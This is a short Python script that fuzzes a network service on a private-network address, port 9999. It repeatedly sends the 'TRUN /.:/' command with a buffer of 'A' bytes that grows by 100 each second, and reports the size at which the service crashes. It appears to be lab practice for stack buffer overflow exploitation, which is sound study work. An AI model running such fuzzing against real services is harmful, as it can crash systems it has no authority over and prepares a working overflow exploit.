#!/usr/bin/python3
import sys, socket
from time import sleep
     
buffer = b"A" * 100
     
while True:
     
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.1.6", 9999))
     
        s.send((b'TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + b"A"*100
     
    except:
     
        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()

